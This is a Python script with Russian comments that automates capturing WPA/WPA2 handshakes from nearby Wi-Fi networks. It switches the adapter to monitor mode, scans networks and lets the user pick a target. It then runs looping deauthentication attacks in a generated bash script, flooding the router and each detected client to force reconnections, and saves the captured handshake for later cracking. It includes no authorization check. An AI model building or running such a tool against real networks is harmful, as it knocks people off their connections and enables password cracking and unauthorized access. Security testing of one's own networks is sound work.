#!/usr/bin/env python3
"""
Захват WPA/WPA2 handshake через airodump-ng + aireplay-ng.
Требует: root, iw, airodump-ng, aireplay-ng, aircrack-ng.
Интерфейс должен быть в режиме monitor (скрипт переводит сам).
"""

import os
import sys
import time
import signal
import subprocess
import re
import threading
from pathlib import Path
import shutil
import tempfile     

# ============ Утилиты ============

def check_root():
    if os.geteuid() != 0:
        print("[-] Запустите с sudo.")
        sys.exit(1)


def check_tools():
    missing = []
    for tool in ("iw", "airodump-ng", "aireplay-ng", "aircrack-ng", "ip"):
        if subprocess.run(["which", tool], capture_output=True).returncode != 0:
            missing.append(tool)
    if missing:
        print(f"[-] Не найдены утилиты: {', '.join(missing)}")
        sys.exit(1)


def run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True)


def get_interface_mode(interface):
    r = run(["iw", "dev", interface, "info"])
    m = re.search(r"type\s+(\w+)", r.stdout)
    return m.group(1) if m else "unknown"


def set_interface_mode(interface, mode):
    subprocess.run(["ip", "link", "set", interface, "down"], check=True)
    subprocess.run(["iw", "dev", interface, "set", "type", mode], check=True)
    subprocess.run(["ip", "link", "set", interface, "up"], check=True)


def ensure_monitor(interface):
    if get_interface_mode(interface).lower() == "monitor":
        print(f"[+] {interface} уже в режиме monitor.")
        return True
    print(f"[*] Перевод {interface} в monitor")
    try:
        set_interface_mode(interface, "monitor")
        print("[+] Готово.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[-] Не удалось переключить режим: {e}")
        return False


def restore_managed(interface):
    try:
        if get_interface_mode(interface).lower() == "monitor":
            print(f"[*] Возвращаю {interface} в managed...")
            set_interface_mode(interface, "managed")
    except Exception:
        pass



# ============ Сканирование ============

def parse_airodump_csv(csv_path):
    """Парсит CSV от airodump-ng: AP + станции. Помечает сети с клиентами."""
    networks = []
    if not os.path.exists(csv_path):
        return networks
    try:
        with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception:
        return networks

    start = 0
    while start < len(lines) and not lines[start].strip():
        start += 1
    if start >= len(lines):
        return networks

    ap_lines = []
    station_lines = []
    in_stations = False

    for line in lines[start:]:
        s = line.rstrip('\n').rstrip('\r')
        if not s.strip():
            continue
        if s.startswith('Station MAC'):
            in_stations = True
            continue
        if in_stations:
            station_lines.append(s)
        else:
            ap_lines.append(s)

    if len(ap_lines) < 2:
        return networks

    header = [h.strip() for h in ap_lines[0].split(',')]
    col = {name.lower(): i for i, name in enumerate(header)}
    if 'bssid' not in col:
        return networks

    max_idx = max(col.get(n, 0) for n in
                  ('bssid', 'channel', 'privacy', 'cipher',
                   'authentication', 'power', 'essid'))

    bssid_re = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')

    for line in ap_lines[1:]:
        parts = line.split(',')
        if len(parts) <= max_idx:
            continue

        def get(name):
            i = col.get(name)
            return parts[i].strip() if i is not None and i < len(parts) else ''

        bssid = get('bssid')
        if not bssid_re.match(bssid):
            continue

        networks.append({
            'bssid':        bssid,
            'channel':      get('channel'),
            'essid':        get('essid'),
            'privacy':      get('privacy'),
            'cipher':       get('cipher'),
            'auth':         get('authentication'),
            'power':        get('power'),
            'has_stations': False,
        })

    # Станции: формат "Station MAC, ..., BSSID AP, Probed ESSIDs"
    stations_bssids = set()
    for line in station_lines:
        parts = line.split(',')
        if len(parts) < 6:
            continue
        b = parts[5].strip()
        if bssid_re.match(b):
            stations_bssids.add(b.upper())

    for net in networks:
        if net['bssid'].upper() in stations_bssids:
            net['has_stations'] = True

    return networks


GREEN = "\033[92m"
RESET = "\033[0m"


def _power_to_int(p):
    try:
        return int(p)
    except (ValueError, TypeError):
        return -999


def display_networks(networks):
    if not networks:
        print("[-] Сети не найдены.")
        return

    # Слабые сверху (-90), сильные снизу (-40)
    networks.sort(key=lambda n: _power_to_int(n['power']))

    print("\n{:<4} {:<20} {:<4} {:<6} {:<30} {:<12}".format(
        "№", "BSSID", "Ch", "PWR", "ESSID", "Шифрование"
    ))
    print("-" * 90)

    for i, net in enumerate(networks, 1):
        essid = net['essid'] if net['essid'] else '<скрытая>'
        privacy = net['privacy'] if net['privacy'] else 'Open'
        line = "{:<4} {:<20} {:<4} {:<6} {:<30} {:<12}".format(
            i, net['bssid'], net['channel'], net['power'], essid[:28], privacy
        )
        if net.get('has_stations'):
            print(f"{GREEN}{line}{RESET}")
        else:
            print(line)

def ask_scan_duration():
    print("\nВремя сканирования:")
    print("  Enter или 0 — бесконечно (Ctrl+C для остановки) [по умолчанию]")
    print("  Или число секунд")
    value = input()
    if value == "":
        return None
    try:
        n = int(value)
        return None if n <= 0 else n
    except ValueError:
        print("[-] Некорректно. Использую бесконечный режим.")
        return None

def find_terminal():
    """Ищет доступный эмулятор терминала. Возвращает (имя, базовую команду)."""
    candidates = [
        ("xterm",          ["xterm", "-e"]),
        ("qterminal",      ["qterminal", "-e"]),
        ("xfce4-terminal", ["xfce4-terminal", "-e"]),
        ("gnome-terminal", ["gnome-terminal", "--"]),
        ("konsole",        ["konsole", "-e"]),
    
    ]
    for name, cmd in candidates:
        if shutil.which(name):
            return name, cmd
    return None, None

def scan_networks(interface, duration, work_dir):
    """
    Запускает airodump-ng (2.4 + 5 ГГц) в отдельном окне терминала,
    параллельно следит за CSV и показывает счётчик найденных сетей.
    Ctrl+C или истечение duration — останавливает сканирование.
    """
    work_dir = Path(work_dir)
    prefix = str(work_dir / "scan")
    csv_file = f"{prefix}-01.csv"

    airodump_cmd = (
        f'airodump-ng --band abg '
        f'--write "{prefix}" '
        f'--output-format csv --write-interval 1 '
        f'{interface}'
    )

    term_name, term_cmd = find_terminal()
    term_proc = None

    if term_name:
        script_path = work_dir / "scan.sh"
        script_path.write_text(
            "#!/bin/bash\n"
            "echo 'Сканирование 2.4 + 5 ГГц. Ctrl+C — остановить.'\n"
            "echo\n"
            f"{airodump_cmd}\n"
        )
        script_path.chmod(0o755)

        if term_name == "gnome-terminal":
            launch = term_cmd + ["bash", str(script_path)]
        else:
            # xterm, konsole, qterminal, xfce4-terminal — все хотят одну строку
            launch = term_cmd + [f"bash {script_path}"]

        try:
            term_proc = subprocess.Popen(launch, preexec_fn=os.setsid)
        except Exception as e:
            print(f"[!] Не удалось открыть {term_name}: {e}")
            term_proc = None

    if term_proc is None:
        print("[!] Терминал не найден, запускаю сканирование здесь же.")
        cmd = ["airodump-ng", "--band", "abg",
               "--write", prefix, "--output-format", "csv",
               "--write-interval", "1", interface]
        term_proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )

    if duration is None:
        print("[*] Сканирование... Ctrl+C — остановить.")
    else:
        print(f"[*] Сканирование {duration} сек (Ctrl+C — остановить).")

    try:
        if duration is None:
            while term_proc.poll() is None:
                time.sleep(1)
        else:
            for remaining in range(duration, 0, -1):
                if term_proc.poll() is not None:
                    break
                time.sleep(1)
                print(f"\r[*] Осталось: {remaining:3d} сек", end='', flush=True)
            print()
    except KeyboardInterrupt:
        print("\n[*] Остановлено.")
    finally:
        if term_proc.poll() is None:
            try:
                os.killpg(os.getpgid(term_proc.pid), signal.SIGINT)
                try:
                    term_proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(term_proc.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                pass
        time.sleep(1)   # пауза, чтобы CSV успел зафлашиться на диск

    networks = parse_airodump_csv(csv_file)
    print(f"[+] Итого найдено сетей: {len(networks)}")
    return networks


# ============ Проверка handshake ============

def check_handshake(cap_file):
    if not os.path.exists(cap_file) or os.path.getsize(cap_file) == 0:
        return False
    try:
        r = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=30
        )
        out = r.stdout + r.stderr
        if re.search(r"\b1 handshake\b", out, re.IGNORECASE):
            return True
        if "WPA handshake" in out:
            return True
    except Exception:
        pass
    return False


# ============ Захват handshake ============

def _build_capture_script(work_dir, interface, target):
    """Готовит bash-скрипт для окна airodump-ng при захвате handshake."""
    bssid = target['bssid']
    channel = target['channel']
    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
    cap_file = f"{prefix}-01.cap"

    cmd = (
        f'airodump-ng --bssid {bssid} --channel {channel} '
        f'--write "{prefix}" --output-format pcap,csv '
        f'{interface}'
    )

    script_path = Path(work_dir) / "capture.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f"echo '=== Захват handshake: {target['essid'] or '<скрытая>'} ({bssid}), канал {channel} ==='\n"
        "echo 'Ctrl+C — остановить захват.'\n"
        "echo\n"
        f"{cmd}\n"
    )
    script_path.chmod(0o755)
    return script_path, cap_file


def _build_deauth_script(work_dir, interface, target):
    """
    bash-скрипт для окна деаутентификации.
    Фаза 1: broadcast на роутер (обнаружение клиентов).
    Фаза 2: targeted deauth по каждому найденному клиенту.
    Цикл повторяется, если handshake не пойман.
    """
    bssid = target['bssid']
    prefix = str(Path(work_dir) / f"capture_{bssid.replace(':', '')}")
    csv_file = f"{prefix}-01.csv"

    script_path = Path(work_dir) / "deauth.sh"
    script_path.write_text(
        "#!/bin/bash\n"
        f'IFACE="{interface}"\n'
        f'BSSID="{bssid}"\n'
        f'CSV="{csv_file}"\n'
        "\n"
        "echo '=== Деаутентификация ==='\n"
        "echo \"Цель (роутер): $BSSID\"\n"
        "echo \"Интерфейс:     $IFACE\"\n"
        "echo \"CSV станций:   $CSV\"\n"
        "echo 'Ctrl+C — остановить.'\n"
        "echo\n"
        "\n"
        "ROUND=0\n"
        "while true; do\n"
        "    ROUND=$((ROUND+1))\n"
        "    echo\n"
        "    echo \"========== Раунд $ROUND ==========\"\n"
        "\n"
        "    # --- Фаза 1: broadcast на роутер ---\n"
        "    echo \"[$(date +%H:%M:%S)] Фаза 1: broadcast deauth на роутер\"\n"
        "    aireplay-ng --deauth 15 -a \"$BSSID\" \"$IFACE\" 2>&1 | tail -5\n"
        "    echo \"[$(date +%H:%M:%S)] Ждём 8 сек, чтобы клиенты переподключились...\"\n"
        "    sleep 8\n"
        "\n"
        "    # --- Читаем станции из CSV ---\n"
        "    if [ ! -f \"$CSV\" ]; then\n"
        "        echo \"[$(date +%H:%M:%S)] CSV ещё не создан, повторяю broadcast.\"\n"
        "        continue\n"
        "    fi\n"
        "\n"
        "    STATIONS=$(awk -F',' -v bssid=\"$BSSID\" '\n"
        "        /^Station MAC/ { in_st = 1; next }\n"
        "        in_st {\n"
        "            gsub(/^ +| +$/, \"\", $1)\n"
        "            gsub(/^ +| +$/, \"\", $6)\n"
        "            if (toupper($6) == toupper(bssid) && $1 != \"\") print $1\n"
        "        }\n"
        "    ' \"$CSV\" | sort -u)\n"
        "\n"
        "    if [ -z \"$STATIONS\" ]; then\n"
        "        echo \"[$(date +%H:%M:%S)] Клиентов пока нет. Повторяю broadcast.\"\n"
        "        continue\n"
        "    fi\n"
        "\n"
        "    N=$(echo \"$STATIONS\" | wc -l)\n"
        "    echo \"[$(date +%H:%M:%S)] Обнаружено клиентов: $N\"\n"
        "\n"
        "    # --- Фаза 2: targeted deauth по каждому клиенту ---\n"
        "    for STATION in $STATIONS; do\n"
        "        echo \"[$(date +%H:%M:%S)] Фаза 2: targeted deauth -> $STATION\"\n"
        "        aireplay-ng --deauth 20 -a \"$BSSID\" -c \"$STATION\" \"$IFACE\" 2>&1 | tail -3\n"
        "        sleep 3\n"
        "    done\n"
        "\n"
        "    echo \"[$(date +%H:%M:%S)] Все клиенты обработаны. Новый раунд через 20 сек...\"\n"
        "    sleep 20\n"
        "done\n"
    )
    script_path.chmod(0o755)
    return script_path


def _launch_in_terminal(term_name, term_cmd, script_path):
    """Запускает bash-скрипт в отдельном окне терминала. Возвращает Popen или None."""
    if term_name == "gnome-terminal":
        launch = term_cmd + ["bash", str(script_path)]
    else:
        launch = term_cmd + [f"bash {script_path}"]
    try:
        return subprocess.Popen(launch, preexec_fn=os.setsid)
    except Exception as e:
        print(f"[!] Не удалось открыть {term_name}: {e}")
        return None


def _kill_group(proc):
    """Корректно гасит группу процессов (терминал + его дети)."""
    if proc is None or proc.poll() is not None:
        return
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGINT)
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    except (ProcessLookupError, PermissionError):
        pass

def _any_file_fresh(paths, threshold=15):
    """True, если хотя бы один из файлов обновлялся не позднее threshold сек назад."""
    for p in paths:
        if os.path.exists(p) and (time.time() - os.path.getmtime(p)) <= threshold:
            return True
    return False


def _revive_watchdog(interface, watch_files, stop_event,
                     check_interval=5, stale_threshold=30, cooldown=20,
                     revive_seconds=20, startup_grace=45):
    """
    Следит за mtime файлов из watch_files (.cap, .csv). Если ни один
    не обновлялся stale_threshold секунд — гоняет airodump-ng без канала
    revive_seconds секунд, чтобы драйвер переинициализировался.

    startup_grace — окно в начале, пока airodump-ng ещё поднимается и создаёт
    .cap/.csv. В это время отсутствие свежих файлов — норма, а не зависание.
    """
    start = time.time()
    # Фикс: cooldown должен действовать и на первой итерации. С last_revive=0
    # (time.time()-0 ≈ 1.7e9) он никогда не срабатывал, и оживление запускалось
    # сразу же, ещё до создания файлов захвата.
    last_revive = start
    seen_file = False

    while not stop_event.is_set():
        time.sleep(check_interval)
        if stop_event.is_set():
            break

        # Фаза старта: airodump-ng ещё не создал файлы — не считаем это зависанием.
        if time.time() - start < startup_grace:
            continue

        # Пока ни один файл ни разу не появился, захват ещё поднимается, а не завис.
        # Как только файл появился хоть раз — дальше судим по свежести mtime.
        if any(os.path.exists(p) for p in watch_files):
            seen_file = True
        elif not seen_file:
            continue

        if _any_file_fresh(watch_files, stale_threshold):
            continue

        if time.time() - last_revive < cooldown:
            continue

        print(f"\n[!] Ни .cap, ни .csv не обновляются >{stale_threshold} сек — "
              f"оживляю без фиксации канала ({revive_seconds} сек).")

        revive = subprocess.Popen(
            ["airodump-ng", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )
        try:
            for _ in range(revive_seconds):
                time.sleep(1)
                if stop_event.is_set():
                    break
        finally:
            try:
                os.killpg(os.getpgid(revive.pid), signal.SIGINT)
                try:
                    revive.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    os.killpg(os.getpgid(revive.pid), signal.SIGKILL)
            except (ProcessLookupError, PermissionError):
                pass

        last_revive = time.time()
        print("[+] Оживление завершено.")

def capture_handshake(interface, target, work_dir, timeout=180, deauth=True):

    bssid = target['bssid']
    channel = target['channel']
    essid = target['essid'] or '<скрытая>'

    if not channel.isdigit():
        print(f"[-] Некорректный канал: {channel!r}")
        return None

    # Фиксируем канал адаптера, чтобы оба окна работали на одном канале
    subprocess.run(["iw", "dev", interface, "set", "channel", channel],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    work_dir = Path(work_dir)
    cap_script, cap_file = _build_capture_script(work_dir, interface, target)

    term_name, term_cmd = find_terminal()
    if term_name is None:
        print("[!] Терминал не найден. Захват в этом окне, без графики.")
        prefix = str(work_dir / f"capture_{bssid.replace(':', '')}")
        airodump = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "--channel", channel,
             "--write", prefix, "--output-format", "pcap", interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        cap_term = None
    else:
        cap_term = _launch_in_terminal(term_name, term_cmd, cap_script)
        airodump = cap_term

    # Общий флаг остановки для фоновых потоков (watchdog + fallback-деаут).
    stop_watchdog = threading.Event()

    deauth_term = None
    if deauth:
        deauth_script = _build_deauth_script(work_dir, interface, target)
        if term_name is not None:
            deauth_term = _launch_in_terminal(term_name, term_cmd, deauth_script)
        else:
            # Завязан на stop_watchdog, иначе поток деаутил бы вечно и после захвата.
            def _deauth_loop():
                while not stop_watchdog.is_set():
                    subprocess.run(
                        ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                    for _ in range(20):
                        if stop_watchdog.is_set():
                            break
                        time.sleep(1)
            threading.Thread(target=_deauth_loop, daemon=True).start()

    print(f"\n[*] Цель:    {essid} ({bssid}), канал {channel}")
    print(f"[*] Файл:    {cap_file}")
    print(f"[*] Таймаут: {timeout} сек (Ctrl+C — остановить)")

    csv_file = cap_file.replace("-01.cap", "-01.csv")
    watch_files = [cap_file, csv_file]

    watchdog = threading.Thread(
        target=_revive_watchdog,
        args=(interface, watch_files, stop_watchdog),
        daemon=True
    )
    watchdog.start()

    start = time.time()
    found = False
    try:
        while time.time() - start < timeout:
            if cap_term is not None and cap_term.poll() is not None:
                print("\n[*] Окно захвата закрыто.")
                break
            if deauth_term is not None and deauth_term.poll() is not None:
                print("\n[*] Окно деаутентификации закрыто.")
                break

            if os.path.exists(cap_file) and check_handshake(cap_file):
                found = True
                print("\n[+] Handshake найден!")
                break

            remaining = int(timeout - (time.time() - start))
            print(f"\r[*] Ожидание... {remaining:3d} сек", end='', flush=True)
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[*] Прервано.")
    finally:
        stop_watchdog.set()
        _kill_group(deauth_term)
        _kill_group(cap_term)
        if cap_term is None and airodump is not None and airodump.poll() is None:
            try:
                airodump.send_signal(signal.SIGINT)
                airodump.wait(timeout=5)
            except Exception:
                airodump.kill()
        time.sleep(1)

    print()
    if os.path.exists(cap_file):
        if found or check_handshake(cap_file):
            print(f"[+] Handshake сохранён: {cap_file}")
        else:
            print(f"[-] Handshake не найден. Файл: {cap_file}")
        return cap_file
    print("[-] Файл захвата не создан.")
    return None


# ============ Основной сценарий ============
def ask_save_path(cap_file):
    """
    Спрашивает, куда сохранить пойманный handshake.
    По умолчанию — текущая рабочая директория (откуда запущен main.py).
    Возвращает Path или None, если пользователь отменил.
    """
    default = Path.cwd() / Path(cap_file).name
    print(f"\n[+] Handshake пойман.")
    print(f"    По умолчанию: {default}")
    print("    Enter — сохранить по умолчанию, 'c' — отменить сохранение.")

    user = input("Путь: ").strip()

    if user.lower() == 'c':
        return None

    if user == "":
        target = default
    else:
        target = Path(user).expanduser()
        if target.is_dir():
            target = target / Path(cap_file).name

    # Создаём директорию, если её нет
    if not target.parent.exists():
        try:
            target.parent.mkdir(parents=True, exist_ok=True)
        except OSError as e:
            print(f"[-] Не удалось создать директорию: {e}")
            return None

    # Проверяем, не перезапишем ли файл
    if target.exists():
        ans = input(f"'{target}' уже существует. Перезаписать? (y/n): ").strip().lower()
        if ans != 'y':
            print("[*] Сохранение отменено.")
            return None

    return target

def choose_action():
    """
    Меню действий с выбранной сетью.
    Возвращает:
      'deauth'  — активная деаутентификация + захват
      'passive' — пассивное наблюдение
      None      — выход назад
    """
    print("\nДействия с выбранной сетью:")
    print("  1. Деаутентификация")
    print("  2. Пассивное наблюдение")
    print()
    print("  0. Назад")
    while True:
        c = input("Действие: ").strip()
        if c == '0':
            return None
        if c == '1':
            return 'deauth'
        if c == '2':
            return 'passive'
        print("Неизвестный пункт. Введите 1, 2 или 0.")

def handshake_flow(interface):
    # Всё пишем во временную папку. Если handshake не поймаем — она удалится.
    tmp_dir = Path(tempfile.mkdtemp(prefix="wifitool_"))

    try:
        duration = ask_scan_duration()

        networks = scan_networks(interface, duration, tmp_dir)
        if not networks:
            print("[-] Сети не найдены.")
            return

        display_networks(networks)

        # ---- Выбор цели ----
        target = None
        while True:
            try:
                choice = input(
                    f"\nВыберите номер сети (1-{len(networks)}, 0 — отмена): "
                ).strip()
            except (KeyboardInterrupt, EOFError):
                print("\n[*] Отменено.")
                return

            if choice == "":
                print("Пустой ввод. Введите число или 0 для отмены.")
                continue
            if choice == "0":
                print("[*] Отменено.")
                return

            try:
                idx = int(choice) - 1
            except ValueError:
                print(f"Ошибка: нужно целое число от 0 до {len(networks)}.")
                continue

            if 0 <= idx < len(networks):
                target = networks[idx]
                break
            print(f"Ошибка: число должно быть от 1 до {len(networks)}.")

        # ---- Цикл действий над выбранной сетью ----
        while True:
            print(f"\n[*] Цель: {target['essid'] or '<скрытая>'} ({target['bssid']})")
            action = choose_action()
            if action is None:
                print("[*] Возврат в меню.")
                return

            if action == 'deauth':
                deauth = True
            elif action == 'passive':
                deauth = False
            else:
                print(f"[-] Неизвестное действие: {action}")
                continue

            try:
                timeout_str = input("\nТаймаут захвата в секундах (Enter = 180): ").strip()
                timeout = int(timeout_str) if timeout_str else 180
                if timeout <= 0:
                    timeout = 180
            except ValueError:
                timeout = 180

            cap_file = capture_handshake(
                interface, target, tmp_dir,
                timeout=timeout, deauth=deauth
            )

            if cap_file and os.path.exists(cap_file) and check_handshake(cap_file):
                save_path = ask_save_path(cap_file)
                if save_path:
                    try:
                        shutil.move(cap_file, save_path)
                        print(f"\n[+] Handshake сохранён: {save_path}")
                    except Exception as e:
                        print(f"[-] Не удалось сохранить: {e}")
                else:
                    print("[*] Файл не сохранён.")
            else:
                print("\n[-] Handshake не пойман.")


    finally:
        try:
            shutil.rmtree(tmp_dir, ignore_errors=True)
        except Exception:
            pass

def main():
    check_root()
    check_tools()

    if len(sys.argv) > 1:
        interface = sys.argv[1]
    else:
        interface = input("Введите имя Wi-Fi интерфейса (например, wlan0): ").strip()

    if not interface:
        print("[-] Интерфейс не указан.")
        sys.exit(1)

    # Проверка, что интерфейс существует
    r = run(["iw", "dev", interface, "info"])
    if r.returncode != 0:
        print(f"[-] Интерфейс {interface} не найден.")
        sys.exit(1)

    try:
        if not ensure_monitor(interface):
            sys.exit(1)
        handshake_flow(interface)
    finally:
        restore_managed(interface)


if __name__ == '__main__':
    main()